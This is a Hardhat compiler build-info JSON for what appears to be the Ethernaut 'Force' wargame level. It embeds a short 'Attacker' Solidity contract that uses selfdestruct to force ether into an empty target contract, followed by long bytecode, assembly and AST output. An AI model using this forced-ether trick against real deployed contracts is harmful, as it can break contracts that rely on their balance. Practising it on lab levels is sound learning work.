{
	"id": "725e64f9428eeec39c93d859d7792052",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.24",
	"solcLongVersion": "0.8.24+commit.e11b9ed9",
	"input": {
		"language": "Solidity",
		"sources": {
			"tests/test07.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"src/level07.sol\";\n\ncontract Attacker\n{\n    Force level07;\n\n    constructor(Force _level07)\n    {\n        level07 = Force(_level07);\n    }\n\n    function attack() public payable \n    {\n        address payable theAddress = payable(address(level07));\n        selfdestruct(theAddress);\n    }\n\n    function getBalance() view external returns(uint)\n    {\n        return address(this).balance;\n    }\n\n    receive() external payable { }\n}"
			},
			"src/level07.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Force {/*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =Ã¸= /\n (______)__m_m)\n\n*/}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"src/level07.sol": {
				"Force": {
					"abi": [],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"src/level07.sol\":57:175  contract Force {/*... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"src/level07.sol\":57:175  contract Force {/*... */\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa2646970667358221220c31732e8e7423c36c8fe326fa2e171ed7064fbd6fd01e0f0f6c66d2fe723739b64736f6c63430008180033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "6080604052348015600e575f80fd5b50603e80601a5f395ff3fe60806040525f80fdfea2646970667358221220c31732e8e7423c36c8fe326fa2e171ed7064fbd6fd01e0f0f6c66d2fe723739b64736f6c63430008180033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xE JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x3E DUP1 PUSH1 0x1A PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC3 OR ORIGIN 0xE8 0xE7 TIMESTAMP EXTCODECOPY CALLDATASIZE 0xC8 INVALID ORIGIN PUSH16 0xA2E171ED7064FBD6FD01E0F0F6C66D2F 0xE7 0x23 PUSH20 0x9B64736F6C634300081800330000000000000000 ",
							"sourceMap": "57:118:0:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "60806040525f80fdfea2646970667358221220c31732e8e7423c36c8fe326fa2e171ed7064fbd6fd01e0f0f6c66d2fe723739b64736f6c63430008180033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC3 OR ORIGIN 0xE8 0xE7 TIMESTAMP EXTCODECOPY CALLDATASIZE 0xC8 INVALID ORIGIN PUSH16 0xA2E171ED7064FBD6FD01E0F0F6C66D2F 0xE7 0x23 PUSH20 0x9B64736F6C634300081800330000000000000000 ",
							"sourceMap": "57:118:0:-:0;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "12400",
								"executionCost": "64",
								"totalCost": "12464"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 57,
									"end": 175,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 57,
									"end": 175,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 57,
									"end": 175,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 57,
									"end": 175,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 57,
									"end": 175,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 57,
									"end": 175,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 57,
									"end": 175,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 57,
									"end": 175,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 57,
									"end": 175,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 57,
									"end": 175,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 57,
									"end": 175,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 57,
									"end": 175,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 57,
									"end": 175,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 57,
									"end": 175,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 57,
									"end": 175,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 57,
									"end": 175,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 57,
									"end": 175,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 57,
									"end": 175,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 57,
									"end": 175,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 57,
									"end": 175,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 57,
									"end": 175,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220c31732e8e7423c36c8fe326fa2e171ed7064fbd6fd01e0f0f6c66d2fe723739b64736f6c63430008180033",
									".code": [
										{
											"begin": 57,
											"end": 175,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 57,
											"end": 175,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 57,
											"end": 175,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 57,
											"end": 175,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 57,
											"end": 175,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 57,
											"end": 175,
											"name": "REVERT",
											"source": 0
										}
									]
								}
							},
							"sourceList": [
								"src/level07.sol",
								"tests/test07.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.24+commit.e11b9ed9\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/level07.sol\":\"Force\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/level07.sol\":{\"keccak256\":\"0xf53390973d7d18f12d7f4793246c9e975e3dc79747a5b19d7aa208d822e3c0a0\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://b06a24e8ced7e4d911bde16ff4e0a1bf9b268fdf208d792a8ccaeb76b4683fd0\",\"dweb:/ipfs/Qma7Gttk6FzF1DApBB6vPWxrdNJxWXaAHQ45zdAYTfSdjg\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"tests/test07.sol": {
				"Attacker": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "contract Force",
									"name": "_level07",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "attack",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "getBalance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"tests/test07.sol\":84:494  contract Attacker... */\n  mstore(0x40, 0x80)\n    /* \"tests/test07.sol\":128:202  constructor(Force _level07)... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"tests/test07.sol\":186:194  _level07 */\n  dup1\n    /* \"tests/test07.sol\":170:177  level07 */\n  0x00\n  dup1\n    /* \"tests/test07.sol\":170:195  level07 = Force(_level07) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"tests/test07.sol\":128:202  constructor(Force _level07)... */\n  pop\n    /* \"tests/test07.sol\":84:494  contract Attacker... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_21\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:675   */\ntag_12:\n    /* \"#utility.yul\":616:623   */\n  0x00\n    /* \"#utility.yul\":645:669   */\n  tag_23\n    /* \"#utility.yul\":663:668   */\n  dup3\n    /* \"#utility.yul\":645:669   */\n  tag_11\n  jump\t// in\ntag_23:\n    /* \"#utility.yul\":634:669   */\n  swap1\n  pop\n    /* \"#utility.yul\":568:675   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":681:825   */\ntag_13:\n    /* \"#utility.yul\":765:800   */\n  tag_25\n    /* \"#utility.yul\":794:799   */\n  dup2\n    /* \"#utility.yul\":765:800   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":758:763   */\n  dup2\n    /* \"#utility.yul\":755:801   */\n  eq\n    /* \"#utility.yul\":745:819   */\n  tag_26\n  jumpi\n    /* \"#utility.yul\":815:816   */\n  0x00\n    /* \"#utility.yul\":812:813   */\n  dup1\n    /* \"#utility.yul\":805:817   */\n  revert\n    /* \"#utility.yul\":745:819   */\ntag_26:\n    /* \"#utility.yul\":681:825   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":831:996   */\ntag_14:\n    /* \"#utility.yul\":899:904   */\n  0x00\n    /* \"#utility.yul\":930:936   */\n  dup2\n    /* \"#utility.yul\":924:937   */\n  mload\n    /* \"#utility.yul\":915:937   */\n  swap1\n  pop\n    /* \"#utility.yul\":946:990   */\n  tag_28\n    /* \"#utility.yul\":984:989   */\n  dup2\n    /* \"#utility.yul\":946:990   */\n  tag_13\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":831:996   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1002:1375   */\ntag_3:\n    /* \"#utility.yul\":1083:1089   */\n  0x00\n    /* \"#utility.yul\":1132:1134   */\n  0x20\n    /* \"#utility.yul\":1120:1129   */\n  dup3\n    /* \"#utility.yul\":1111:1118   */\n  dup5\n    /* \"#utility.yul\":1107:1130   */\n  sub\n    /* \"#utility.yul\":1103:1135   */\n  slt\n    /* \"#utility.yul\":1100:1219   */\n  iszero\n  tag_30\n  jumpi\n    /* \"#utility.yul\":1138:1217   */\n  tag_31\n  tag_8\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":1100:1219   */\ntag_30:\n    /* \"#utility.yul\":1258:1259   */\n  0x00\n    /* \"#utility.yul\":1283:1358   */\n  tag_32\n    /* \"#utility.yul\":1350:1357   */\n  dup5\n    /* \"#utility.yul\":1341:1347   */\n  dup3\n    /* \"#utility.yul\":1330:1339   */\n  dup6\n    /* \"#utility.yul\":1326:1348   */\n  add\n    /* \"#utility.yul\":1283:1358   */\n  tag_14\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":1273:1358   */\n  swap2\n  pop\n    /* \"#utility.yul\":1229:1368   */\n  pop\n    /* \"#utility.yul\":1002:1375   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"tests/test07.sol\":84:494  contract Attacker... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"tests/test07.sol\":84:494  contract Attacker... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x12065fe0\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"tests/test07.sol\":357:456  function getBalance() view external returns(uint)... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_7\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_7:\n      pop\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"tests/test07.sol\":208:351  function attack() public payable ... */\n    tag_4:\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      stop\n        /* \"tests/test07.sol\":357:456  function getBalance() view external returns(uint)... */\n    tag_9:\n        /* \"tests/test07.sol\":401:405  uint */\n      0x00\n        /* \"tests/test07.sol\":428:449  address(this).balance */\n      selfbalance\n        /* \"tests/test07.sol\":421:449  return address(this).balance */\n      swap1\n      pop\n        /* \"tests/test07.sol\":357:456  function getBalance() view external returns(uint)... */\n      swap1\n      jump\t// out\n        /* \"tests/test07.sol\":208:351  function attack() public payable ... */\n    tag_13:\n        /* \"tests/test07.sol\":256:282  address payable theAddress */\n      0x00\n        /* \"tests/test07.sol\":301:308  level07 */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"tests/test07.sol\":256:310  address payable theAddress = payable(address(level07)) */\n      swap1\n      pop\n        /* \"tests/test07.sol\":333:343  theAddress */\n      dup1\n        /* \"tests/test07.sol\":320:344  selfdestruct(theAddress) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      selfdestruct\n        /* \"#utility.yul\":7:84   */\n    tag_16:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_17:\n        /* \"#utility.yul\":177:201   */\n      tag_21\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_16\n      jump\t// in\n    tag_21:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_11:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_23\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_17\n      jump\t// in\n    tag_23:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122025d6d4c61fa7b32ffa9e44b4ae5c1e1165ebe425ac8422290a648572452fbfb564736f6c63430008180033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_21": {
									"entryPoint": null,
									"id": 21,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"abi_decode_t_contract$_Force_$2_fromMemory": {
									"entryPoint": 209,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_contract$_Force_$2_fromMemory": {
									"entryPoint": 229,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 153,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_contract$_Force_$2": {
									"entryPoint": 170,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 122,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 118,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_contract$_Force_$2": {
									"entryPoint": 187,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:1378:2",
										"nodeType": "YulBlock",
										"src": "0:1378:2",
										"statements": [
											{
												"body": {
													"nativeSrc": "47:35:2",
													"nodeType": "YulBlock",
													"src": "47:35:2",
													"statements": [
														{
															"nativeSrc": "57:19:2",
															"nodeType": "YulAssignment",
															"src": "57:19:2",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "73:2:2",
																		"nodeType": "YulLiteral",
																		"src": "73:2:2",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "67:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:2"
																},
																"nativeSrc": "67:9:2",
																"nodeType": "YulFunctionCall",
																"src": "67:9:2"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nativeSrc": "57:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:2"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nativeSrc": "7:75:2",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nativeSrc": "40:6:2",
														"nodeType": "YulTypedName",
														"src": "40:6:2",
														"type": ""
													}
												],
												"src": "7:75:2"
											},
											{
												"body": {
													"nativeSrc": "177:28:2",
													"nodeType": "YulBlock",
													"src": "177:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "194:1:2",
																		"nodeType": "YulLiteral",
																		"src": "194:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "197:1:2",
																		"nodeType": "YulLiteral",
																		"src": "197:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "187:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:2"
																},
																"nativeSrc": "187:12:2",
																"nodeType": "YulFunctionCall",
																"src": "187:12:2"
															},
															"nativeSrc": "187:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "187:12:2"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nativeSrc": "88:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:2"
											},
											{
												"body": {
													"nativeSrc": "300:28:2",
													"nodeType": "YulBlock",
													"src": "300:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "317:1:2",
																		"nodeType": "YulLiteral",
																		"src": "317:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "320:1:2",
																		"nodeType": "YulLiteral",
																		"src": "320:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "310:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:2"
																},
																"nativeSrc": "310:12:2",
																"nodeType": "YulFunctionCall",
																"src": "310:12:2"
															},
															"nativeSrc": "310:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "310:12:2"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nativeSrc": "211:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:2"
											},
											{
												"body": {
													"nativeSrc": "379:81:2",
													"nodeType": "YulBlock",
													"src": "379:81:2",
													"statements": [
														{
															"nativeSrc": "389:65:2",
															"nodeType": "YulAssignment",
															"src": "389:65:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "404:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "404:5:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "411:42:2",
																		"nodeType": "YulLiteral",
																		"src": "411:42:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nativeSrc": "400:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "400:3:2"
																},
																"nativeSrc": "400:54:2",
																"nodeType": "YulFunctionCall",
																"src": "400:54:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "389:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "389:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nativeSrc": "334:126:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "361:5:2",
														"nodeType": "YulTypedName",
														"src": "361:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "371:7:2",
														"nodeType": "YulTypedName",
														"src": "371:7:2",
														"type": ""
													}
												],
												"src": "334:126:2"
											},
											{
												"body": {
													"nativeSrc": "511:51:2",
													"nodeType": "YulBlock",
													"src": "511:51:2",
													"statements": [
														{
															"nativeSrc": "521:35:2",
															"nodeType": "YulAssignment",
															"src": "521:35:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "550:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "550:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nativeSrc": "532:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "532:17:2"
																},
																"nativeSrc": "532:24:2",
																"nodeType": "YulFunctionCall",
																"src": "532:24:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "521:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "521:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nativeSrc": "466:96:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "493:5:2",
														"nodeType": "YulTypedName",
														"src": "493:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "503:7:2",
														"nodeType": "YulTypedName",
														"src": "503:7:2",
														"type": ""
													}
												],
												"src": "466:96:2"
											},
											{
												"body": {
													"nativeSrc": "624:51:2",
													"nodeType": "YulBlock",
													"src": "624:51:2",
													"statements": [
														{
															"nativeSrc": "634:35:2",
															"nodeType": "YulAssignment",
															"src": "634:35:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "663:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "663:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_address",
																	"nativeSrc": "645:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "645:17:2"
																},
																"nativeSrc": "645:24:2",
																"nodeType": "YulFunctionCall",
																"src": "645:24:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "634:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "634:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_contract$_Force_$2",
												"nativeSrc": "568:107:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "606:5:2",
														"nodeType": "YulTypedName",
														"src": "606:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "616:7:2",
														"nodeType": "YulTypedName",
														"src": "616:7:2",
														"type": ""
													}
												],
												"src": "568:107:2"
											},
											{
												"body": {
													"nativeSrc": "735:90:2",
													"nodeType": "YulBlock",
													"src": "735:90:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "803:16:2",
																"nodeType": "YulBlock",
																"src": "803:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "812:1:2",
																					"nodeType": "YulLiteral",
																					"src": "812:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "815:1:2",
																					"nodeType": "YulLiteral",
																					"src": "815:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "805:6:2",
																				"nodeType": "YulIdentifier",
																				"src": "805:6:2"
																			},
																			"nativeSrc": "805:12:2",
																			"nodeType": "YulFunctionCall",
																			"src": "805:12:2"
																		},
																		"nativeSrc": "805:12:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "805:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "758:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "758:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "794:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "794:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_contract$_Force_$2",
																					"nativeSrc": "765:28:2",
																					"nodeType": "YulIdentifier",
																					"src": "765:28:2"
																				},
																				"nativeSrc": "765:35:2",
																				"nodeType": "YulFunctionCall",
																				"src": "765:35:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "755:2:2",
																			"nodeType": "YulIdentifier",
																			"src": "755:2:2"
																		},
																		"nativeSrc": "755:46:2",
																		"nodeType": "YulFunctionCall",
																		"src": "755:46:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "748:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "748:6:2"
																},
																"nativeSrc": "748:54:2",
																"nodeType": "YulFunctionCall",
																"src": "748:54:2"
															},
															"nativeSrc": "745:74:2",
															"nodeType": "YulIf",
															"src": "745:74:2"
														}
													]
												},
												"name": "validator_revert_t_contract$_Force_$2",
												"nativeSrc": "681:144:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "728:5:2",
														"nodeType": "YulTypedName",
														"src": "728:5:2",
														"type": ""
													}
												],
												"src": "681:144:2"
											},
											{
												"body": {
													"nativeSrc": "905:91:2",
													"nodeType": "YulBlock",
													"src": "905:91:2",
													"statements": [
														{
															"nativeSrc": "915:22:2",
															"nodeType": "YulAssignment",
															"src": "915:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
